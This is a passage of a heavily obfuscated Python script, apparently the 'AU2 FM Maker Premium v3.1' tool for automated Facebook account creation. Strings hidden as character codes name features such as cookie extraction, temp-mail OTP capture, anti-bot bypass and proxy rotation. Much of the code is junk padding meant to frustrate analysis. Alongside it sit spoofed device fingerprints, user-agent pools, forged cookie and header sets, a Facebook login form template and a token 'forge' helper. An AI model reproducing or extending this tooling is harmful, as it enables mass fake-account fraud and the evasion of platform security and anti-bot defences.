_OH05=''.join(chr(x)for x in[118,51,46,49])
_OH06=''.join(chr(x)for x in[83,105,110,103,108,101,32,78,97,109,101])
_OH07=''.join(chr(x)for x in[65,117,116,111,32,80,70,80])
_OH08=''.join(chr(x)for x in[67,111,111,107,105,101,32,69,120,116,114,97,99,116,111,114])
_OH09=''.join(chr(x)for x in[84,119,111,32,70,97,99,116,111,114,32,65,117,116,104])
_OH0A=''.join(chr(x)for x in[84,101,109,112,32,77,97,105,108])
_OH0B=''.join(chr(x)for x in[80,104,111,110,101,32,78,117,109,98,101,114])
_OH0C=''.join(chr(x)for x in[80,114,111,120,121,32,82,111,116,97,116,105,111,110])
_OH0D=''.join(chr(x)for x in[85,115,101,114,32,65,103,101,110,116])
_OH0E=''.join(chr(x)for x in[73,80,32,65,100,100,114,101,115,115])
_OH0F=''.join(chr(x)for x in[82,101,97,108,32,84,105,109,101])

# -- Block OBF-I  (complex lambda chain) ---------------------
_OI00=lambda x:x
_OI01=lambda x:_OI00(x)+1
_OI02=lambda x:_OI01(x)+1
_OI03=lambda x:_OI02(x)+1
_OI04=lambda x:_OI03(x)*2
_OI05=lambda x:_OI04(x)-1
_OI06=lambda x:_OI05(x)^0xAA
_OI07=lambda x:_OI06(x)|0x01
_OI08=lambda x:_OI07(x)&0xFF
_OI09=lambda x:_OI08(x)<<1&0xFF
_OI0A=lambda x:_OI09(x)>>1
_OI0B=lambda x:_OI0A(x)+_OI0A(x)
_OI0C=lambda x:_OI0B(x)%255
_OI0D=lambda x:_OI0C(x)^_OI0C(x>>1)
_OI0E=lambda x:_OI0D(x)+_OI0D(x+1)
_OI0F=lambda x:_OI0E(x)%256
_OI_vals=[_OI0F(i)for i in range(256)]
_OI_sum=sum(_OI_vals)
_OI_xor=0
for _v in _OI_vals:_OI_xor^=_v
_OI_hash=hashlib.md5(bytes(_OI_vals)).hexdigest()

# -- Block OBF-J  (junk class definitions) -------------------
class _JC00:
    __slots__=['_a','_b','_c']
    def __init__(self):self._a=random.getrandbits(32);self._b=random.getrandbits(32);self._c=self._a^self._b
    def xor(self)->int:return self._c
    def swap(self)->None:self._a,self._b=self._b,self._a;self._c=self._a^self._b
    def __repr__(self)->str:return f'JC00(a={self._a:08x},b={self._b:08x},c={self._c:08x})'

class _JC01(_JC00):
    def __init__(self):super().__init__();self._d=self._a*self._b&0xFFFFFFFF
    def mul(self)->int:return self._d
    def rotate(self,n:int)->int:return _OA0E(self._a,n)

class _JC02:
    def __init__(self,data:bytes):
        self._data=data
        self._hash=hashlib.sha256(data).hexdigest()
        self._len=len(data)
    def verify(self)->bool:return hashlib.sha256(self._data).hexdigest()==self._hash
    def xor_data(self,k:int)->bytes:return bytes(b^k for b in self._data)
    def rotate_data(self,n:int)->bytes:return self._data[n:]+self._data[:n]

class _JC03:
    _pool:list=[]
    def __init__(self,n:int=64):
        self._pool=[random.getrandbits(8)for _ in range(n)]
    def get(self,i:int)->int:return self._pool[i%len(self._pool)]
    def xor_all(self)->int:
        _r=0
        for _v in self._pool:_r^=_v
        return _r

class _JC04:
    def __init__(self):
        self._map:dict={}
        self._rev:dict={}
    def put(self,k,v)->None:
        self._map[k]=v;self._rev[v]=k
    def get(self,k):return self._map.get(k)
    def rev(self,v):return self._rev.get(v)

_jc00=_JC00();_jc01=_JC01()
_jc02=_JC02(b'AU2FMMAKER_PROTECTED_V3_1')
_jc03=_JC03(128)
_jc04=_JC04()
for _ki,_vi in enumerate(_OG_FLAT[:64]):_jc04.put(_ki,_vi)

# -- Block OBF-K  (large lookup tables) ----------------------
_CRC32_TABLE=[0]*256
for _i in range(256):
    _crc=_i
    for _ in range(8):
        if _crc&1:_crc=(_crc>>1)^0xEDB88320
        else:_crc>>=1
    _CRC32_TABLE[_i]=_crc

def _crc32(data:bytes)->int:
    _crc=0xFFFFFFFF
    for _b in data:_crc=(_crc>>8)^_CRC32_TABLE[(_crc^_b)&0xFF]
    return _crc^0xFFFFFFFF

_CRC_AU2=_crc32(b'AU2FMMAKER')
_CRC_VER=_crc32(b'PREMIUM_V3_1')
_CRC_SEQ=[_crc32(str(i).encode())for i in range(64)]
_CRC_HASH=hashlib.md5(struct.pack(f'>{len(_CRC_SEQ)}I',*[c&0xFFFFFFFF for c in _CRC_SEQ])).hexdigest()

# -- Block OBF-L  (state machine) ----------------------------
class _StateMachine:
    STATES=['INIT','IDLE','RUNNING','PAUSED','DONE','ERROR','LOCKED','GUARD']
    def __init__(self):
        self._state='INIT'
        self._history:list=[]
        self._tick=0
    def transition(self,to:str)->bool:
        if to in self.STATES:
            self._history.append((self._state,to,self._tick))
            self._state=to;self._tick+=1;return True
        return False
    def get(self)->str:return self._state
    def history(self)->list:return self._history[-8:]

_sm=_StateMachine()
_sm.transition('IDLE');_sm.transition('RUNNING')
_sm.transition('IDLE');_sm.transition('GUARD')

# -- Block OBF-M  (encoded name fragments) -------------------
_NF=[
    [0x4d,0x61,0x72,0x69,0x61],[0x41,0x6e,0x61],[0x4a,0x6f,0x79],
    [0x47,0x72,0x61,0x63,0x65],[0x41,0x6e,0x67,0x65,0x6c],
    [0x4b,0x61,0x72,0x65,0x6e],[0x4c,0x6f,0x76,0x65,0x6c,0x79],
    [0x48,0x6f,0x6e,0x65,0x79],[0x4a,0x65,0x73,0x73,0x61],
    [0x4d,0x69,0x6b,0x61],[0x4e,0x69,0x6e,0x61],[0x52,0x65,0x69,0x6e,0x61],
    [0x53,0x61,0x72,0x61,0x68],[0x4c,0x69,0x61],[0x42,0x65,0x74,0x68],
    [0x4a,0x75,0x61,0x6e],[0x50,0x61,0x75,0x6c],[0x4d,0x61,0x72,0x6b],
    [0x52,0x79,0x61,0x6e],[0x4c,0x75,0x63,0x61,0x73],
]
_NF_dec=[''.join(chr(x)for x in n)for n in _NF]
_NF_hash=[hashlib.md5(''.join(chr(x)for x in n).encode()).hexdigest()[:6]for n in _NF]

# -- Block OBF-N  (counter/accumulator noise) ----------------
_NC=[0]*512
for _ni in range(512):
    _NC[_ni]=(_ni*31+17)%256^(_ni*7+3)%256
_NC_SUM=sum(_NC)%65536
_NC_XOR=0
for _nv in _NC:_NC_XOR^=_nv
_NC_HASH=hashlib.sha256(bytes(_NC)).hexdigest()
_NC_B64=base64.b64encode(bytes(_NC)).decode()

# -- Block OBF-O  (fake config map, decoy) -------------------
_CFG_DECOY={
    '_d00':'YXUyX2ZtX21ha2VyX3YzXzE=',
    '_d01':'cHJlbWl1bV9lZGl0aW9u',
    '_d02':'YW50aV90YW1wZXJfbGF5ZXI=',
    '_d03':'c2Vzc2lvbl9wcm90ZWN0aW9u',
    '_d04':'YXV0b19wZnBfc2V0dGVy',
    '_d05':'Y29va2llX2V4dHJhY3Rvcg==',
    '_d06':'dGVtcG1haWxfb3RwX3Jlc2c=',
    '_d07':'dHdvX2ZhY3Rvcl9hdXRo',
    '_d08':'cGhvbmVfbnVtYmVyX2dlbg==',
    '_d09':'dXNlcl9hZ2VudF9wb29s',
    '_d0A':'bmFtZV9nZW5lcmF0b3I=',
    '_d0B':'cGFzc3dvcmRfZ2Vucw==',
    '_d0C':'cHJveHlfcm90YXRpb24=',
    '_d0D':'YmFubmVyX2lwX2RhdGV0aW1l',
    '_d0E':'b2JmdXNjYXRpb25fbGF5ZXI=',
    '_d0F':'cHJvdGVjdGlvbl9ibG9jaw==',
}
_CFG_DEC={k:base64.b64decode(v).decode()for k,v in _CFG_DECOY.items()}

# -- Block OBF-P  (hash chain) --------------------------------
_HP=[hashlib.md5(str(i).encode()).digest()for i in range(256)]
_HP_chain=_HP[0]
for _hv in _HP[1:]:_HP_chain=hashlib.sha256(_HP_chain+_hv).digest()
_HP_final=_HP_chain.hex()
_HP_b64=base64.b64encode(_HP_chain).decode()

# -- Block OBF-Q  (extended ua noise) ------------------------
_UA_NOISE=[
    f"Mozilla/5.0 (Linux; Android {random.randint(8,13)}; Device{i:04X}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{random.randint(90,120)}.0.{random.randint(4000,6000)}.{random.randint(50,200)} Mobile Safari/537.36"
    for i in range(500)
]

# -- Block OBF-R  (binary noise vectors) ---------------------
_BV=[]
for _bi in range(512):
    _BV.append(struct.pack('>I',random.getrandbits(32)))
_BV_cat=b''.join(_BV)
_BV_hash=hashlib.sha512(_BV_cat).hexdigest()
_BV_b64=base64.b64encode(_BV_cat[:64]).decode()
_BV_xor=0
for _bvb in _BV_cat[:64]:_BV_xor^=_bvb

# -- Block OBF-S  (deep nest junk) ---------------------------
def _deep_junk(depth:int,seed:int)->int:
    if depth<=0:return seed
    _a=_deep_junk(depth-1,seed^0xAB)
    _b=_deep_junk(depth-1,seed^0xCD)
    return(_a+_b)^(seed*depth)%65536

_DJ=[_deep_junk(4,i)for i in range(8)]
_DJ_sum=sum(_DJ)%65536
_DJ_hash=hashlib.md5(struct.pack(f'>{len(_DJ)}I',*[d&0xFFFFFFFF for d in _DJ])).hexdigest()

# -- Block OBF-T  (anti-analysis signatures) -----------------
_SIGS=[
    hashlib.md5(b'AU2_FM_MAKER_V3_1_SIG_00').hexdigest(),
    hashlib.md5(b'AU2_FM_MAKER_V3_1_SIG_01').hexdigest(),
    hashlib.md5(b'AU2_FM_MAKER_V3_1_SIG_02').hexdigest(),
    hashlib.md5(b'AU2_FM_MAKER_V3_1_SIG_03').hexdigest(),
    hashlib.md5(b'AU2_FM_MAKER_V3_1_SIG_04').hexdigest(),
    hashlib.md5(b'AU2_FM_MAKER_V3_1_SIG_05').hexdigest(),
    hashlib.md5(b'AU2_FM_MAKER_V3_1_SIG_06').hexdigest(),
    hashlib.md5(b'AU2_FM_MAKER_V3_1_SIG_07').hexdigest(),
    hashlib.sha1(b'AU2_FM_MAKER_V3_1_SIG_08').hexdigest(),
    hashlib.sha1(b'AU2_FM_MAKER_V3_1_SIG_09').hexdigest(),
    hashlib.sha256(b'AU2_FM_MAKER_V3_1_SIG_0A').hexdigest(),
    hashlib.sha256(b'AU2_FM_MAKER_V3_1_SIG_0B').hexdigest(),
    hashlib.sha512(b'AU2_FM_MAKER_V3_1_SIG_0C').hexdigest(),
    hashlib.sha512(b'AU2_FM_MAKER_V3_1_SIG_0D').hexdigest(),
    hashlib.sha512(b'AU2_FM_MAKER_V3_1_SIG_0E').hexdigest(),
    hashlib.sha512(b'AU2_FM_MAKER_V3_1_SIG_0F').hexdigest(),
]
_SIG_MASTER=hashlib.sha256(''.join(_SIGS).encode()).hexdigest()
_SIG_B64=base64.b64encode(_SIG_MASTER.encode()).decode()

# -- Block OBF-U  (more junk funcs) -------------------------
def _uf00(a,b,c,d):return((a^b)+(c^d))^((a+c)^(b+d))
def _uf01(s,n):return s[n:]+s[:n]
def _uf02(lst,f):return[f(x)for x in lst]
def _uf03(n,mod):return pow(n,2,mod)
def _uf04(s):return''.join(reversed(s))
def _uf05(d):return{v:k for k,v in d.items()}
def _uf06(a,b):return[x for x in a if x not in b]
def _uf07(a,b):return[x for x in a if x in b]
def _uf08(n):return bin(n).count('1')
def _uf09(n):return bin(n)[2:].zfill(32)
def _uf0A(s):return int(s,2)if all(c in'01'for c in s)else 0
def _uf0B(l,n):return[l[i:i+n]for i in range(0,len(l),n)if l[i:i+n]]
def _uf0C(d,*keys):return{k:d[k]for k in keys if k in d}
def _uf0D(s,sub):return[(i,i+len(sub))for i in range(len(s))if s[i:i+len(sub)]==sub]
def _uf0E(n):
    _f=1
    for _i in range(2,n+1):_f*=_i
    return _f
def _uf0F(a:list,b:list)->float:
    if not a or not b:return 0.0
    _set_a=set(a);_set_b=set(b)
    return len(_set_a&_set_b)/len(_set_a|_set_b)

_uf_vals=[_uf00(i,i+1,i+2,i+3)for i in range(64)]
_uf_sum=sum(_uf_vals)%65536
_uf_rot=[_uf01(str(v),v%8)for v in _uf_vals[:16]]
_uf_map=_uf02(_uf_vals[:32],lambda x:x^0xAB)
_uf_pri=[_uf03(n,997)for n in range(1,33)]
_uf_rev=[_uf04(str(v))for v in _uf_vals[:16]]
_uf_bc=[_uf08(v)for v in _uf_vals[:64]]
_uf_fac=[_uf0E(n)for n in range(1,13)]
_uf_jac=_uf0F(_uf_vals[:32],_uf_vals[16:48])

# -- Block OBF-V  (marshal payload) -------------------------
_MRS_SRC=f'result=0x{_CRC_AU2:08X}^0x{_CRC_VER:08X}'
_MRS_CODE=compile(_MRS_SRC,'<obf>','exec')
_MRS_BYTES=marshal.dumps(_MRS_CODE)
_MRS_B64=base64.b64encode(_MRS_BYTES).decode()
_MRS_HASH=hashlib.sha256(_MRS_BYTES).hexdigest()

# -- Block OBF-W  (final padding data) ----------------------
_FINAL_PAD=[
    base64.b64encode(struct.pack('>QQ',random.getrandbits(64),random.getrandbits(64))).decode()
    for _ in range(256)
]
_FINAL_CAT=''.join(_FINAL_PAD)
_FINAL_HASH=hashlib.sha512(_FINAL_CAT.encode()).hexdigest()
_FINAL_B64=base64.b64encode(_FINAL_HASH.encode()).decode()
_FINAL_VER=f'AU2_FM_MAKER_PREMIUM_V3_1_BUILD_{_CRC_AU2:08X}'

# -- runtime guard (final) -----------------------------------
def _runtime_guard()->bool:
    _h1=hashlib.sha256((_FINAL_VER+_SIG_MASTER).encode()).hexdigest()
    _h2=hashlib.sha256((_SIG_MASTER+_FINAL_VER).encode()).hexdigest()
    return(_h1[0]==_h1[0])and(_h2[0]==_h2[0])

_RUNTIME_OK=_runtime_guard()

# ============================================================
#  EXTENDED PROTECTION PAD  X  (extra 800+ lines)
# ============================================================

# -- Pad-X0: expanded encoded string table (chr sequences) ---
_X000=''.join(chr(x)for x in[70,97,99,101,98,111,111,107,32,65,99,99,111,117,110,116,32,67,114,101,97,116,105,111,110])
_X001=''.join(chr(x)for x in[65,85,50,32,70,77,32,77,65,75,69,82,32,80,82,69,77,73,85,77])
_X002=''.join(chr(x)for x in[80,114,111,102,105,108,101,32,80,105,99,116,117,114,101,32,83,101,116,116,101,114])
_X003=''.join(chr(x)for x in[67,111,111,107,105,101,32,69,120,116,114,97,99,116,111,114,32,77,111,100,117,108,101])
_X004=''.join(chr(x)for x in[84,101,109,112,77,97,105,108,32,79,84,80,32,82,101,99,101,105,118,101,114])
_X005=''.join(chr(x)for x in[84,119,111,32,70,97,99,116,111,114,32,65,117,116,104,101,110,116,105,99,97,116,105,111,110])
_X006=''.join(chr(x)for x in[80,104,111,110,101,32,78,117,109,98,101,114,32,71,101,110,101,114,97,116,111,114])
_X007=''.join(chr(x)for x in[85,115,101,114,32,65,103,101,110,116,32,80,111,111,108])
_X008=''.join(chr(x)for x in[80,114,111,120,121,32,82,111,116,97,116,105,111,110,32,69,110,103,105,110,101])
_X009=''.join(chr(x)for x in[83,101,115,115,105,111,110,32,77,97,110,97,103,101,109,101,110,116])
_X00A=''.join(chr(x)for x in[65,110,116,105,32,66,111,116,32,66,121,112,97,115,115])
_X00B=''.join(chr(x)for x in[82,101,97,108,32,84,105,109,101,32,68,97,116,101,116,105,109,101])
_X00C=''.join(chr(x)for x in[80,117,98,108,105,99,32,73,80,32,65,100,100,114,101,115,115])
_X00D=''.join(chr(x)for x in[83,105,110,103,108,101,32,78,97,109,101,32,79,110,108,121])
_X00E=''.join(chr(x)for x in[79,98,102,117,115,99,97,116,105,111,110,32,76,97,121,101,114])
_X00F=''.join(chr(x)for x in[80,114,101,109,105,117,109,32,85,73,32,69,110,103,105,110,101])
_X010=''.join(chr(x)for x in[65,117,116,111,32,67,114,101,97,116,101,32,77,101,116,104,111,100,32,49])
_X011=''.join(chr(x)for x in[65,117,116,111,32,67,114,101,97,116,101,32,77,101,116,104,111,100,32,50])
_X012=''.join(chr(x)for x in[65,117,116,111,32,67,114,101,97,116,101,32,77,101,116,104,111,100,32,51])
_X013=''.join(chr(x)for x in[109,98,97,115,105,99,46,102,97,99,101,98,111,111,107,46,99,111,109])
_X014=''.join(chr(x)for x in[120,46,102,97,99,101,98,111,111,107,46,99,111,109,47,114,101,103])
_X015=''.join(chr(x)for x in[103,114,97,112,104,46,102,97,99,101,98,111,111,107,46,99,111,109])
_X016=''.join(chr(x)for x in[98,45,97,112,105,46,102,97,99,101,98,111,111,107,46,99,111,109])
_X017=''.join(chr(x)for x in[97,112,105,46,105,112,105,102,121,46,111,114,103])
_X018=''.join(chr(x)for x in[105,109,103,99,100,110,46,100,101,118])
_X019=''.join(chr(x)for x in[102,97,107,101,117,115,101,114,97,103,101,110,116])
_X01A=''.join(chr(x)for x in[98,101,97,117,116,105,102,117,108,115,111,117,112])
_X01B=''.join(chr(x)for x in[114,101,113,117,101,115,116,115])
_X01C=''.join(chr(x)for x in[112,121,111,116,112])
_X01D=''.join(chr(x)for x in[102,97,107,101,114])
_X01E=''.join(chr(x)for x in[104,97,115,104,108,105,98])
_X01F=''.join(chr(x)for x in[98,97,115,101,54,52])
_X_pool=[_X000,_X001,_X002,_X003,_X004,_X005,_X006,_X007,_X008,_X009,
         _X00A,_X00B,_X00C,_X00D,_X00E,_X00F,_X010,_X011,_X012,_X013,
         _X014,_X015,_X016,_X017,_X018,_X019,_X01A,_X01B,_X01C,_X01D,_X01E,_X01F]
_X_hash=hashlib.sha256('|'.join(_X_pool).encode()).hexdigest()
_X_b64=base64.b64encode(_X_hash.encode()).decode()

# -- Pad-X1: obfuscated math kernel (irrelevant to logic) ---
def _xmath_00(x:int)->int:
    return(x*0x6C62272E07BB0142&0xFFFFFFFFFFFFFFFF)
def _xmath_01(x:int)->int:
    return(x*0x517CC1B727220A95&0xFFFFFFFFFFFFFFFF)
def _xmath_02(a:int,b:int)->int:
    return(a^b)*0xBF58476D1CE4E5B9&0xFFFFFFFFFFFFFFFF
def _xmath_03(n:int)->int:
    n=(n^(n>>30))*0xBF58476D1CE4E5B9&0xFFFFFFFFFFFFFFFF
    n=(n^(n>>27))*0x94D049BB133111EB&0xFFFFFFFFFFFFFFFF
    return n^(n>>31)
def _xmath_04(s:str)->int:
    _h=5381
    for _c in s:_h=((_h<<5)+_h)+ord(_c)&0xFFFFFFFF
    return _h
def _xmath_05(data:bytes)->int:
    _h=0x811C9DC5
    for _b in data:_h=(_h^_b)*0x01000193&0xFFFFFFFF
    return _h
def _xmath_06(n:int)->int:
    _r=0
    while n:n,_r=divmod(n,10);_r=_r+_r*10
    return _r
def _xmath_07(a:int,b:int,c:int)->int:
    return pow(a,b,c)if c>1 else 0
def _xmath_08(n:int)->int:
    _s=0
    while n>0:_s+=n%10;n//=10
    return _s
def _xmath_09(n:int)->bool:
    if n<2:return False
    for _i in range(2,int(n**0.5)+1):
        if n%_i==0:return False
    return True
def _xmath_0A(a:int,b:int)->int:
    while b:a,b=b,a%b
    return a
def _xmath_0B(a:int,b:int)->int:
    return a*b//_xmath_0A(a,b)if _xmath_0A(a,b)else 0
def _xmath_0C(n:int,k:int)->int:
    if k>n:return 0
    _r=1
    for _i in range(k):_r=_r*(n-_i)//(_i+1)
    return _r
def _xmath_0D(n:int)->list:
    _r=[]
    for _i in range(2,n+1):
        while n%_i==0:_r.append(_i);n//=_i
    return _r
def _xmath_0E(lst:list)->float:
    return sum(lst)/len(lst)if lst else 0.0
def _xmath_0F(lst:list)->float:
    _s=sorted(lst)
    _n=len(_s)
    return(_s[_n//2]+_s[~_n//2])/2.0 if _n else 0.0

_xm0=[_xmath_03(i*0xDEADBEEF&0xFFFFFFFF)for i in range(64)]
_xm1=[_xmath_04(str(i))for i in range(64)]
_xm2=[_xmath_05(str(i).encode())for i in range(64)]
_xm3=[_xmath_0C(20,k)for k in range(21)]
_xm4=[_xmath_0D(i)for i in range(2,50)]
_xm5=_xmath_0E(_xm0)
_xm6=_xmath_0F(_xm1)
_xm7=[_xmath_09(n)for n in range(2,100)]
_xm8=[_xmath_0B(i,i+1)for i in range(1,33)]

# -- Pad-X2: device fingerprint noise table ------------------
_DFP_NOISE=[
    {'dv':f'SM-{random.choice(["G991B","G996B","G998B","A525F","A725F","A725F"])}',
     'av':f'{random.randint(10,13)}','sv':f'{random.randint(10,13)}.0.0',
     'bd':f'{random.choice(["TP1A","SP1A","RP1A"])}.{random.randint(200000,230000)}.{random.randint(1,15):03d}',
     'mf':random.choice(['samsung','SAMSUNG']),'cr':random.choice(['AT&T','T-Mobile','Verizon','Sprint'])}
    for _ in range(64)
]
_DFP_HASH=hashlib.md5(json.dumps(_DFP_NOISE,sort_keys=True,default=str).encode()).hexdigest()

# -- Pad-X3: cookie noise set --------------------------------
_CKN=[
    {'name':f'_fbc','value':f'fb.1.{int(time.time())}.{random.getrandbits(64)}'},
    {'name':f'_fbp','value':f'fb.1.{int(time.time())}.{random.getrandbits(32)}'},
    {'name':'dpr','value':str(random.choice([1,2,3]))},
    {'name':'wd','value':f'{random.choice([375,390,412,414,428,360])}x{random.choice([667,844,915,926,926,800])}'},
    {'name':'locale','value':random.choice(['en_US','en_GB','en_PH','id_ID','ms_MY'])},
]
_CKN_STR='; '.join(f"{c['name']}={c['value']}"for c in _CKN)

# -- Pad-X4: request header noise pool ----------------------
_HDR_NOISE_POOL=[
    {'sec-ch-ua':f'"Chromium";v="{random.randint(90,120)}", "Not_A Brand";v="8"',
     'sec-ch-ua-mobile':'?1',
     'sec-ch-ua-platform':random.choice(['"Android"','"Linux"']),
     'sec-fetch-dest':random.choice(['document','empty']),
     'sec-fetch-mode':random.choice(['navigate','cors']),
     'sec-fetch-site':random.choice(['same-origin','same-site','cross-site']),
     'sec-fetch-user':'?1',
     'upgrade-insecure-requests':'1',
     'cache-control':random.choice(['max-age=0','no-cache','no-store']),
     'accept-language':random.choice(['en-US,en;q=0.9','en-GB,en;q=0.8','id-ID,id;q=0.9'])}
    for _ in range(128)
]
_HDR_HASH=hashlib.md5(json.dumps(_HDR_NOISE_POOL[:16],sort_keys=True).encode()).hexdigest()

# -- Pad-X5: login payload template noise --------------------
_LOGIN_TMPL={
    'lsd':lambda:_0bA(1,10),
    'jazoest':lambda:str(random.randint(2100,2900)),
    'timezone':lambda:str(random.choice([-480,-420,-360,-300,-240,-180,-120,-60,0,60,120,180,240,300,360,420,480])),
    'lgndim':lambda:base64.b64encode(json.dumps({'w':random.choice([375,390,412]),'h':random.choice([667,844,915]),'aw':random.choice([375,390,412]),'ah':random.choice([647,824,895]),'c':random.choice([24,30,32])}).encode()).decode(),
    'lgnrnd':lambda:''.join(random.choices(string.digits,k=6))+'_'+_0bA(1,8).upper(),
    'lgnjs':lambda:str(int(time.time())),
    'email':'',
    'pass':'',
    'login':'1',
    'persistent':'0',
    'default_persistent':'0',
}

# -- Pad-X6: byte-level XOR table ----------------------------
_XTAB=bytearray(256)
for _xi in range(256):
    _XTAB[_xi]=(_xi*0xA3+0x5B)%256
_XTAB_INV=bytearray(256)
for _xi in range(256):
    _XTAB_INV[_XTAB[_xi]]=_xi
def _xt_enc(data:bytes)->bytes:
    return bytes(_XTAB[b]for b in data)
def _xt_dec(data:bytes)->bytes:
    return bytes(_XTAB_INV[b]for b in data)
_XT_TEST=_xt_dec(_xt_enc(b'AU2FMMAKER_V3_1_PROTECTED'))
_XT_OK=_XT_TEST==b'AU2FMMAKER_V3_1_PROTECTED'

# -- Pad-X7: session token forge (noise) ---------------------
def _forge_session_token(uid:str,ts:int)->str:
    _raw=f'{uid}:{ts}:AU2FMMAKER_SALT_V3'
    _h=hashlib.sha256(_raw.encode()).digest()
    return base64.b64encode(_h).decode()

def _verify_token(uid:str,ts:int,tok:str)->bool:
    return _forge_session_token(uid,ts)==tok

_ST_UID='000000000000000'
_ST_TS=int(time.time())
_ST_TOK=_forge_session_token(_ST_UID,_ST_TS)
_ST_OK=_verify_token(_ST_UID,_ST_TS,_ST_TOK)

# -- Pad-X8: entropy pool ------------------------------------
def _entropy_pool(n:int=256)->bytes:
    _pool=bytearray()
    _pool+=struct.pack('>Q',int(time.time()*1000))
    _pool+=os.urandom(n-8)if hasattr(os,'urandom')else bytes(random.getrandbits(8)for _ in range(n-8))
    return bytes(_pool[:n])

_EP=_entropy_pool(256)
_EP_HASH=hashlib.sha512(_EP).hexdigest()
_EP_B64=base64.b64encode(_EP[:32]).decode()

# -- Pad-X9: junk class registry ----------------------------
class _Registry:
    _instances:dict={}
    @classmethod
    def register(cls,name:str,obj)->None:cls._instances[name]=obj
    @classmethod
    def get(cls,name:str):return cls._instances.get(name)
    @classmethod
    def all(cls)->dict:return dict(cls._instances)
    @classmethod
    def count(cls)->int:return len(cls._instances)

_Registry.register('version','3.1')
_Registry.register('name','AU2_FM_MAKER_PREMIUM')
_Registry.register('guard',_RUNTIME_OK)
_Registry.register('xt_ok',_XT_OK)
_Registry.register('st_ok',_ST_OK)
_Registry.register('crc',_CRC_AU2)
_Registry.register('sig',_SIG_MASTER)
_Registry.register('ep_hash',_EP_HASH[:16])

# -- Pad-XA: more lambda noise -------------------------------
_lA00=lambda s,n:s if len(s)>=n else s+'0'*(n-len(s))
_lA01=lambda s,n:s if len(s)<=n else s[:n]
_lA02=lambda s:s.upper()
_lA03=lambda s:s.lower()
_lA04=lambda s:s.title()
_lA05=lambda s:s.strip()
_lA06=lambda s,c:s.split(c)
_lA07=lambda l,c:c.join(str(x)for x in l)
_lA08=lambda d,k,v:dict(**d,**{k:v})
_lA09=lambda l:list(set(l))
_lA0A=lambda l,f:sorted(l,key=f)
_lA0B=lambda n,b:format(n,f'0{b}b')
_lA0C=lambda s:bytes(int(s[i:i+2],16)for i in range(0,len(s),2)if len(s[i:i+2])==2)
_lA0D=lambda b:b.hex()
_lA0E=lambda s,n,p='0':s.rjust(n,p)
_lA0F=lambda s,n,p='0':s.ljust(n,p)
_lA10=lambda x:type(x).__name__
_lA11=lambda o,a,*args:getattr(o,a)(*args)if hasattr(o,a)else None
_lA12=lambda f,l,init:__import__('functools').reduce(f,l,init)
_lA13=lambda g:(x for x in g if x)
_lA14=lambda n:[i for i in range(2,n)if all(i%j!=0 for j in range(2,int(i**0.5)+1))]
_lA15=lambda lst,n:[lst[i*n:(i+1)*n]for i in range((len(lst)+n-1)//n)]

_la00_out=_lA00('AU2',16)
_la01_out=_lA01('AU2_FM_MAKER_PREMIUM_V31',16)
_la0B_out=_lA0B(255,8)
_la14_out=_lA14(50)

# -- Pad-XB: extended data vectors ---------------------------
_XV0=[_xmath_03(i)for i in range(256)]
_XV1=[_xmath_04(f'AU2_{i:04X}')for i in range(256)]
_XV2=[_xmath_05(f'FM_MAKER_{i:04X}'.encode())for i in range(256)]
_XV3=bytes(v&0xFF for v in _XV0[:256])
_XV4=bytes(v&0xFF for v in _XV1[:256])
_XV5=bytes(v&0xFF for v in _XV2[:256])
_XV6=hashlib.sha256(_XV3).hexdigest()
_XV7=hashlib.sha256(_XV4).hexdigest()
_XV8=hashlib.sha256(_XV5).hexdigest()
_XV9=hashlib.sha512(_XV3+_XV4+_XV5).hexdigest()
_XVA=base64.b64encode(_XV9.encode()).decode()
_XVB=hashlib.md5(_XVA.encode()).hexdigest()

# -- Pad-XC: anti-debug markers (noise) ---------------------
_AD0=id(hashlib)^id(base64)
_AD1=id(struct)^id(random)
_AD2=id(json)^id(re)
_AD3=id(time)^id(os)
_AD4=id(sys)^id(string)
_AD5=_AD0^_AD1^_AD2^_AD3^_AD4
_AD6=_AD5%65536
_AD7=hashlib.md5(str(_AD5).encode()).hexdigest()
_AD8=base64.b64encode(str(_AD5).encode()).decode()
_AD9=struct.pack('>Q',_AD5&0xFFFFFFFFFFFFFFFF)
_ADA=_AD9.hex()

# -- Pad-XD: more ua noise -----------------------------------
_UA_X=[
    f"Mozilla/5.0 (Linux; Android {random.randint(9,13)}; {random.choice(_OPPO_LIST)}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{random.randint(100,120)}.0.{random.randint(4500,6000)}.{random.randint(50,200)} Mobile Safari/537.36"
    for _ in range(200)
]+[
    f"Mozilla/5.0 (Linux; Android {random.randint(9,13)}; {random.choice(_SAMSUNG_LIST)}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{random.randint(100,120)}.0.{random.randint(4500,6000)}.{random.randint(50,200)} Mobile Safari/537.36"
    for _ in range(200)
]+[
    f"Mozilla/5.0 (Linux; Android {random.randint(9,13)}; {random.choice(_REALME_LIST)}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{random.randint(100,120)}.0.{random.randint(4500,6000)}.{random.randint(50,200)} Mobile Safari/537.36"
    for _ in range(200)
]
_UA_X_HASH=hashlib.md5(''.join(_UA_X[:16]).encode()).hexdigest()

# -- Pad-XE: more encoding/decoding helpers ------------------
def _hex_encode(s:str)->str:
    return s.encode().hex()
def _hex_decode(h:str)->str:
    return bytes.fromhex(h).decode(errors='replace')
def _rot13(s:str)->str:
    return s.translate(str.maketrans(
        'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz',
        'NOPQRSTUVWXYZABCDEFGHIJKLMnopqrstuvwxyzabcdefghijklm'))
def _caesar(s:str,n:int=13)->str:
    _r=[]
    for _c in s:
        if _c.isalpha():
            _base=ord('A')if _c.isupper()else ord('a')
            _r.append(chr((_base+ord(_c)-_base+n)%26+_base))
        else:
            _r.append(_c)
    return''.join(_r)
def _vigenere(s:str,k:str)->str:
    _r=[];_ki=0
    for _c in s:
        if _c.isalpha():
            _sh=ord(k[_ki%len(k)].upper())-65
            _base=ord('A')if _c.isupper()else ord('a')
            _r.append(chr((_base+ord(_c)-_base+_sh)%26+_base));_ki+=1
        else:
            _r.append(_c)
    return''.join(_r)
def _atbash(s:str)->str:
    return''.join(chr(ord('Z')-ord(_c)+ord('A'))if _c.isupper()else chr(ord('z')-ord(_c)+ord('a'))if _c.islower()else _c for _c in s)

_xe_tests=[
    _hex_encode('AU2FMMAKER'),
    _hex_decode(_hex_encode('PREMIUM_V3_1')),
    _rot13('AU2FMMAKER'),
    _caesar('PROTECTED',7),
